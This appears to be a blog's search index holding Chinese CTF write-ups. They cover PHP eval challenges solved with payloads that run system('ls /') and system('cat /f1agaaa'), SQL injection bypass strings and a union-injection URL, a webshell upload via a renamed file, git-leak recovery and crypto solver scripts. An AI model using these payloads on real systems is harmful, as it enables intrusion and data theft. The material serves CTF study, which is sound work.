<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>在菜狗杯学到的</title>
    <link href="/2023/11/07/%E5%9C%A8%E8%8F%9C%E7%8B%97%E6%9D%AF%E5%AD%A6%E5%88%B0%E7%9A%84/"/>
    <url>/2023/11/07/%E5%9C%A8%E8%8F%9C%E7%8B%97%E6%9D%AF%E5%AD%A6%E5%88%B0%E7%9A%84/</url>
    
    <content type="html"><![CDATA[<h1 id="刷菜狗杯，总结了一些学到的知识点"><a href="#刷菜狗杯，总结了一些学到的知识点" class="headerlink" title="刷菜狗杯，总结了一些学到的知识点"></a>刷菜狗杯，总结了一些学到的知识点</h1><h2 id="我的眼里只有钱"><a href="#我的眼里只有钱" class="headerlink" title="我的眼里只有钱"></a>我的眼里只有钱</h2><p>源代码如下：<br>‘’’<br>&lt;?php<br>error_reporting(0);<br>extract($<em>POST);<br>eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$</em>);<br>highlight_file(<strong>FILE</strong>);</p><p>‘’’<br>首先是eval函数，就是把里面的字符串当作命令执行，然后extract函数是将post里面的所有参数重叠在一起，然后最不懂的就是$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_，实际类似于c语言中的指针，每个$符号就是将后面的字符串当成了一个新变量，因此可以使用post传参解决</p><p>‘’’<br><em>&#x3D;<strong>&amp;</strong>&#x3D;__</em>&amp;<em><strong>&#x3D;</strong></em><em>&amp;</em><em><strong>&#x3D;</strong></em><strong>&amp;</strong><em><strong>&#x3D;</strong></em><em><strong>&amp;</strong></em><em><strong>&#x3D;</strong></em><strong><strong>&amp;</strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong>&amp;</strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong>&amp;</strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong>&amp;</strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong>&amp;</strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em><em><strong>&#x3D;</strong></em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><em><strong>&#x3D;</strong></em><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>&amp;</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em>___&#x3D;system(‘ls &#x2F;‘)<br>‘’’</p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>‘’’</p><?phperror_reporting(0);highlight_file(__FILE__);eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);''''''http://d0255dc2-b1c4-4916-95b0-a3cfe0495d40.challenge.ctf.show/?b=c&c[0]=1&c[6][0][7][5][8][0][9][4][4]=system("cat /f1agaaa");post: a=bcookie:CTFshow-QQ群：=a'''## ]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>各种题解链接</title>
    <link href="/2023/11/04/%E5%90%84%E7%A7%8D%E9%A2%98%E8%A7%A3%E9%93%BE%E6%8E%A5/"/>
    <url>/2023/11/04/%E5%90%84%E7%A7%8D%E9%A2%98%E8%A7%A3%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/11/04/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/11/04/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="简单总结一下sql注入，持续更新中"><a href="#简单总结一下sql注入，持续更新中" class="headerlink" title="简单总结一下sql注入，持续更新中"></a>简单总结一下sql注入，持续更新中</h1><h2 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h2><p>1.注入时要注意字符型还是整数型<br>2.万能注入公式：1’ or ‘1’&#x3D;’1<br>3.如果过滤甚至删除某些字段，可以考虑双写注入，如将union写为ununionion<br>4.union select查找列数时要把1,2,3都列出来<br>5.联合注入语句<br>6.&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23</p><h2 id="不懂的某些语句详解"><a href="#不懂的某些语句详解" class="headerlink" title="不懂的某些语句详解"></a>不懂的某些语句详解</h2><p>1.在SQL数据库中，GROUP_CONCAT函数用于将多行数据按照指定的顺序连接成一个字符串，并以逗号或其他分隔符分隔。它通常与GROUP BY子句一起使用，用于在分组查询中将多个行的值合并为一个字符串。</p><p>GROUP_CONCAT函数的基本语法如下：</p><p>GROUP_CONCAT(expression [ORDER BY clause] [SEPARATOR separator])<br>其中，expression是要合并的列或表达式，可以是任何数据类型。ORDER BY子句是可选的，用于指定合并后的结果的排序顺序。SEPARATOR参数也是可选的，用于指定合并后的字符串中的分隔符，默认为逗号。</p><p>以下是一个示例，说明GROUP_CONCAT函数的用法： 假设有一个名为students的表，包含学生的姓名和所属班级信息：</p><p>+—-+——-+———+<br>| ID | Name  | Class   |<br>+—-+——-+———+<br>| 1  | Alice | Class A |<br>| 2  | Bob   | Class B |<br>| 3  | Carol | Class A |<br>| 4  | David | Class B |<br>+—-+——-+———+<br>使用GROUP_CONCAT函数可以将每个班级的学生姓名合并成一个字符串，并以逗号分隔：</p><p>SELECT Class, GROUP_CONCAT(Name) AS Students<br>FROM students<br>GROUP BY Class;<br>执行以上查询后，将得到以下结果：</p><p>+———+——————+<br>| Class   | Students         |<br>+———+——————+<br>| Class A | Alice,Carol      |<br>| Class B | Bob,David        |<br>+———+——————+<br>通过使用GROUP_CONCAT函数，我们可以将多个行的值合并为一个字符串，方便进行分组数据的展示和处理。在实际应用中，GROUP_CONCAT函数常用于生成逗号分隔的列表、拼接字符串等场景。</p><p>2.在SQL数据库中，schema_name是用于标识数据库中的模式（schema）的名称。模式是数据库中用于组织和管理对象（例如表、视图、函数等）的逻辑容器。</p><p>每个数据库可以包含多个模式，而每个模式可以包含多个对象。通过使用模式，可以将数据库中的对象进行逻辑分组和组织，以便更好地管理和维护数据库。</p><p>在不同的数据库管理系统中，模式的概念和用法可能会有所不同。在某些数据库中，模式与用户（user）是紧密相关的，每个用户可以有自己的模式，用于隔离和管理其拥有的对象。而在其他数据库中，模式可以被看作是一个独立的命名空间，用于将对象进行分类和组织。</p><p>schema_name通常用于以下场景：</p><p>创建对象时，可以指定所属的模式，以便将对象放置在正确的模式中。<br>引用对象时，可以使用schema_name作为前缀，以明确指定对象所属的模式，避免歧义和冲突。<br>授予和管理权限时，可以将权限授予特定的模式，以控制用户对模式中对象的访问和操作权限。<br>在使用schema_name时，需要注意以下几点：</p><p>不同的数据库管理系统可能有不同的语法和规范来引用模式名称，例如使用双引号、方括号等。<br>某些数据库管理系统可能有默认的模式，用于存储系统级别的对象，例如系统表、视图等。<br>在创建模式和对象时，应该遵循一致的命名规范，以便更好地组织和管理数据库中的对象。<br>总之，schema_name是用于标识数据库中模式的名称，它在数据库中起到组织和管理对象的作用，有助于提高数据库的可维护性和可扩展性。<br>3.在SQL中，GROUP_CONCAT函数可以与FROM子句一起使用，用于在查询中将多个行的值合并为一个字符串，并将其作为单个值返回。</p><p>当GROUP_CONCAT函数与FROM子句一起使用时，通常是在子查询中使用，以便将多个行的值合并为一个字符串，并将其作为单个值返回到主查询中。这样可以方便地在主查询中使用合并后的字符串进行进一步的查询和分析。</p><p>以下是一个示例，说明如何在子查询中使用GROUP_CONCAT函数和FROM子句： 假设有一个名为orders的表，包含订单的信息，其中每个订单可以包含多个产品：</p><p>+—-+———+——–+<br>| ID | OrderID | Product|<br>+—-+———+——–+<br>| 1  | 1001    | A      |<br>| 2  | 1001    | B      |<br>| 3  | 1002    | C      |<br>| 4  | 1002    | D      |<br>| 5  | 1002    | E      |<br>+—-+———+——–+<br>现在我们想要查询每个订单的所有产品，并将其合并为一个逗号分隔的字符串。可以使用以下查询：</p><p>SELECT OrderID, (SELECT GROUP_CONCAT(Product) FROM orders o2 WHERE o2.OrderID &#x3D; o1.OrderID) AS Products<br>FROM orders o1<br>GROUP BY OrderID;<br>执行以上查询后，将得到以下结果：</p><p>+———+———-+<br>| OrderID | Products |<br>+———+———-+<br>| 1001    | A,B      |<br>| 1002    | C,D,E    |<br>+———+———-+<br>在以上查询中，使用了子查询和FROM子句来获取每个订单的所有产品，并使用GROUP_CONCAT函数将其合并为一个字符串。然后将合并后的字符串作为单个值返回到主查询中，以便在主查询中使用。</p><p>总之，GROUP_CONCAT函数可以与FROM子句一起使用，用于将多个行的值合并为一个字符串，并将其作为单个值返回到主查询中。这样可以方便地在主查询中使用合并后的字符串进行进一步的查询和分析。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>工作室招新题write up</title>
    <link href="/2023/11/03/%E5%B7%A5%E4%BD%9C%E5%AE%A4%E6%8B%9B%E6%96%B0%E9%A2%98write-up/"/>
    <url>/2023/11/03/%E5%B7%A5%E4%BD%9C%E5%AE%A4%E6%8B%9B%E6%96%B0%E9%A2%98write-up/</url>
    
    <content type="html"><![CDATA[<h1 id="张峻铭2022090903016-Crcrcr"><a href="#张峻铭2022090903016-Crcrcr" class="headerlink" title="张峻铭2022090903016 Crcrcr"></a>张峻铭2022090903016 Crcrcr</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-ClickMe"><a href="#1-ClickMe" class="headerlink" title="1.ClickMe"></a>1.ClickMe</h3><p>  根据题目应该是点击某个按钮会进行相关反应，而web中唯一的按钮无法点击。使用前缀添加view-source:,查看了网页源代码，发现代码style&#x3D;”pointer-events:auto，即按钮点击功能被禁用。将网页保存后以记事本形式打开，修改pointr_events的参数为auto，再次打开后点击后即可得到flag为Aegis{We1com3_to_2O23_Ae9is_Recruit!}</p><h3 id="2-Get-Post"><a href="#2-Get-Post" class="headerlink" title="2.Get&amp;Post"></a>2.Get&amp;Post</h3><p>  本题为白盒类型，web前端直接给出了后端文件的源代码。通过观察得知，flag会通过cookie发送给用户，而发送cookie的条件为用户分别通过get和post方法传入a和b两个参数，且参数的值相同。</p><h3 id="3-Spider"><a href="#3-Spider" class="headerlink" title="3.Spider"></a>3.Spider</h3><p>  根据题目字面意思此题应为爬虫类题目，点开后提示向网页添加后缀后进入新的网页获取flag，连续操作几次后仍然在跳转的途中。联想到遇到过需要不断点击的整蛊弹窗，考虑经过大量网页跳转后达到目标网页，编写python爬虫代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br>url1 = <span class="hljs-string">&quot;http://139.9.212.160:19001/&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://139.9.212.160:19001/&quot;</span><br>    <span class="hljs-comment"># 发送请求并获取网页内容</span><br>    response = requests.get(url1)<br>    html_content = response.text<br><br>    <span class="hljs-comment"># 使用正则表达式匹配以.html结束的字符串</span><br>    pattern = <span class="hljs-string">r&#x27;\b\w+\.html\b&#x27;</span><br>    matches = re.findall(pattern, html_content)<br>    list_as_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> matches)<br>    url1 = url + list_as_string<br>    <span class="hljs-built_in">print</span>(url1)<br>    <span class="hljs-keyword">if</span>(url1==url):<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>该代码不断爬取网页上符合的字符串并不断粘贴在初始网页后面进行访问，以此达到暴力破解的目的，最后程序运行完后进入倒数第二个网址找到flag为Aegis{foll0w_7he_spider&amp;get_f1ag}</p><h3 id="4-Upload"><a href="#4-Upload" class="headerlink" title="4.Upload"></a>4.Upload</h3><p>页面点击后发现是一个文件提交窗口且仅支持图片类型格式。尝试传入其他格式文件后显示上传失败。上传成功后会给出文件的保存路径。考虑上传一句话木马并修改文件的后缀名为jpg格式以便上传成功。打开burpsuite抓包，将文件名后缀改为.php后放包。将文件保存地址复制后，打开中国蚁剑使用木马中设置的密码进行连接，成功后在&#x2F;flag目录下找到flag为Aegis{Did’u’_see^some_n!ce_pictures?}</p><h3 id="5-Play"><a href="#5-Play" class="headerlink" title="5.Play"></a>5.Play</h3><p>打开页面或发现唯一可点击为一个超链接，点开后发现又被骗了（。考虑使用其他方法，在challenge页面提示为git泄露。使用GitHack进行git抓取，成功生成包含在dist文件夹下的网页文档。在cmd中打开此目录，输入git log -p查看git的提交记录，成功找到在Author: root <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#76;&#65;&#x50;&#84;&#79;&#x50;&#45;&#66;&#x39;&#65;&#x38;&#49;&#x31;&#68;&#x36;&#x2e;&#108;&#x6f;&#99;&#97;&#108;&#100;&#111;&#x6d;&#x61;&#x69;&#x6e;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#76;&#65;&#x50;&#84;&#79;&#x50;&#45;&#66;&#x39;&#65;&#x38;&#49;&#x31;&#68;&#x36;&#x2e;&#108;&#x6f;&#99;&#97;&#108;&#100;&#111;&#x6d;&#x61;&#x69;&#x6e;</a><br>Date:   Thu Jul 20 14:33:02 2023 +0800的提交目录下flag &#x3D; “Aegis{pa1y_f0r_.git!}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>###1.签到题<br>熟悉提交流程的题目，在readme中即可找到flag为 Aegis{Hello_world!}</p><h3 id="2-GFW"><a href="#2-GFW" class="headerlink" title="2.GFW"></a>2.GFW</h3><p>根据题目提示，下载telegram后进入指定用户页面，在输入框输入&#x2F;flag后即可得到一串字符YWVnaXN7T3V0czFkZV90aDNfV2ExbH0&#x3D;.由后面等号判断这是base64编码，解码后flag为aegis{Outs1de_th3_Wa1l}</p><h3 id="3-one-more-cat"><a href="#3-one-more-cat" class="headerlink" title="3.one more cat?"></a>3.one more cat?</h3><p>下载文件后发现未显示后缀名，使用010editor打开后前4个字符为FFD8，判断为jpg文件。修改文件后缀名为jpg文件后顺利打开。观察后发现文件长宽不正确（其实一开始我在文件的十六进制代码随便删着玩，发现刮掉一层后里面还以，误以为是图层重叠什么么的，后面搜了一下才知道是长宽不正确。）查看文件属性得到图片现长宽为1772*723。将两个数据进行十六进制转码得到06EC和02D3，在010editor中找到两个相邻的字串.将图片长度改为04E3后得到flag为Aegis {KGHpnFQM5MfaY9OAV}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-cc的代码1"><a href="#1-cc的代码1" class="headerlink" title="1.cc的代码1"></a>1.cc的代码1</h3><p>观察后发现这是个同余方程，可以利用辗转相除法求得m的值。代码如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def extended_gcd(<span class="hljs-keyword">a</span>, b):<br><br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>        <span class="hljs-literal">return</span> <span class="hljs-keyword">a</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        d, x, y = extended_gcd(b, <span class="hljs-keyword">a</span> % b)<br>        <span class="hljs-literal">return</span> d, y, x - (<span class="hljs-keyword">a</span><span class="hljs-comment"> // b) * y</span><br><br><br>def solve_equation(<span class="hljs-keyword">a</span>, n, target):<br><br>    d, x, y = extended_gcd(<span class="hljs-keyword">a</span>, n)<br>    <span class="hljs-keyword">if</span> target % d != <span class="hljs-number">0</span>:<br>        <span class="hljs-literal">return</span> None  <br>    x *= target<span class="hljs-comment"> // d</span><br>    x %= n<br>    <span class="hljs-literal">return</span> x<br><br><span class="hljs-keyword">a</span> = <span class="hljs-number">8885832285076963111586680210364692820709966457672030441334543789536294316276764325084472715660723570686435234128145259842857647663221372060185195892044064</span><br><br>n = <span class="hljs-number">9060969402803629915292267894492786224273473822492111764553997443209807171984324952573563576103685820371134042358293416805659268231981495201044778198872141</span><br><br>target = <span class="hljs-number">114514</span><br><br>solution = solve_equation(<span class="hljs-keyword">a</span>, n, target)<br><span class="hljs-keyword">if</span> solution is None:<br>    print(<span class="hljs-string">&quot;No solution exists&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    print(<span class="hljs-string">&quot;The value of m is:&quot;</span>, solution)<br></code></pre></td></tr></table></figure><h3 id="R什么A"><a href="#R什么A" class="headerlink" title="R什么A"></a>R什么A</h3><p>根据题意这是个rsa加密算法，给出了两个用户他们的加密过程。由代码可知两个用户加密时使用了相同的p值。运用同模攻击，即计算n1,n2的最大公倍数可得出p的值，进而计算出q1，q2的值。运用拓展按欧几里得分别计算两用户的私钥，最后解密即可。代码如下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">  <span class="hljs-built_in">from</span> Crypto.Util.<span class="hljs-built_in">number</span> import  long_to_byte<br>  e = <span class="hljs-number">0x10001</span><br>  n1 = <span class="hljs-number">133168339217550577216589062233437816811151402796223033430088220416336906835669848994634291919170643581348650874065227137073336317617907512053823559235568701518666617297922184334465523573627967988519834913401715758584414421994725070840582274155375718602963660285184191200529505877324844371003066321517039773577</span><br>  n2 = <span class="hljs-number">97835755437595943550384485863622347994545081725956858027590612679202717629490020118342555446377038561457615114110440677424494746589149302908259809779710879296073535208650014526412949826891681368091148265929650418740652382792259655790387629193930725722742705798634504994801712862675586856497946091948411904811</span><br>  c1 = <span class="hljs-number">79153623056164822940275047499069044582637140703650747599791080674014224831942664718406064442887419006725379874121960823738302298816788211937934636730896427274557688579693244565838177533163514622774701652069473299516660928618067558031889377029541505803032827360621581370094282765008788493519911012912319042922</span><br>  c2 = <span class="hljs-number">25367476846913855168742220843431001349944206244063721403515824033435057384220536226996912522239640399134329525506438764500693894800833986724686905563128127624570309841422954176387059594177714614422407030832520985260687376035390006330027872652761934209690803437576392644066370183311540336426081888423843400476</span><br><br> def gcd(<span class="hljs-keyword">a</span>, b):<br>    <span class="hljs-keyword">while</span> b != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">a</span>, b = b, <span class="hljs-keyword">a</span> % b<br>    <span class="hljs-literal">return</span> <span class="hljs-keyword">a</span><br><br>p=gcd(n1,n2)<br>q1=n<span class="hljs-comment">1//p</span><br>q2=n<span class="hljs-comment">2//p</span><br>phi1=(p<span class="hljs-number">-1</span>)(q1<span class="hljs-number">-1</span>)<br>phi2=(p<span class="hljs-number">-1</span>)(q2<span class="hljs-number">-1</span>)<br>def extended_gcd(<span class="hljs-keyword">a</span>, b):<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>        <span class="hljs-literal">return</span> <span class="hljs-keyword">a</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        d, x, y = extended_gcd(b, <span class="hljs-keyword">a</span> % b)<br>        <span class="hljs-literal">return</span> d, y, x - (<span class="hljs-keyword">a</span><span class="hljs-comment"> // b) * y</span><br><br>def mod_inverse(e, phi):<br>    d = extended_gcd(e, phi)[<span class="hljs-number">1</span>]<br>    d = (d % phi + phi) % phi<br>    <span class="hljs-literal">return</span> d<br>d1=mod_inverse(e,phi1)<br>d2=mod_inverse(e,phi2)<br>m1=pow(c1,d1,n1)<br>m2=pow(c2,d2,n2)<br>t1=long_to_byte(m1)<br>t2=long_to_byte(m2)<br>s1=t1.decode()<br>s2=t2.decode()<br>ans=t1+t2<br></code></pre></td></tr></table></figure><h3 id="3-你这对数保熟吗"><a href="#3-你这对数保熟吗" class="headerlink" title="3.你这对数保熟吗"></a>3.你这对数保熟吗</h3><p>典型的离散对数问题。经过分解后发现原题中p-1分解后发现由2，3，13的大指数幂相乘得到，考虑使用Pohlig_hellman算法解决。（因为没有研究过群和阶的相关知识所以只好去github找到大佬写的代码））））。以下是解决代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python">g = <span class="hljs-number">23</span><br>p = <span class="hljs-number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span><br><br><br>h = <span class="hljs-number">151333891124751042530373058733310229020861747364950371939516479475162992037903347417936196828583151386618599368454072226165444925872870650414551703768232002316254158915083698330990330278130046398088047562784667521913753402515723191873156994035716848303368773750333765220820386506782880732679521051748318241805303190991258449127197189331948934074457050488191283099074865889637545218937526229513889791410777502477696875891082038990413388216830069268272255999388181376286940238370372643791232995202072450723942304527080946432917501351864739416448924582017320060586643735734292637847642023547476853638234949833659591784958385540561237937020927469550605965078493721147809719894402771906021288426916263343205077017375543543255846809902539042307898378549318665401306894386065737984451884222692305472589833388412932383483599881154543926136994191023685493449167048197363831597805973018213602671103739435631408238626910595609595980072843</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\nCalculating prime number decomposition of p-1...&quot;</span>)<br>p_1 = p - <span class="hljs-number">1</span><br>d, factors = <span class="hljs-number">2</span>, []<br><span class="hljs-keyword">while</span> d*d &lt;= p_1:<br>    <span class="hljs-keyword">while</span> (p_1 % d) == <span class="hljs-number">0</span>:<br>        factors.append(d)<br>        p_1 //= d<br>    d += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> p_1 &gt; <span class="hljs-number">1</span>:<br>    factors.append(p)<br><br>factors = [[x, factors.count(x)] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>(factors)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Prime number decomposition of p-1 : \n&#123;&#125;\n\n&quot;</span>.<span class="hljs-built_in">format</span>(factors)) <br><br>x = []<br><span class="hljs-keyword">for</span> factor <span class="hljs-keyword">in</span> factors:<br>    <span 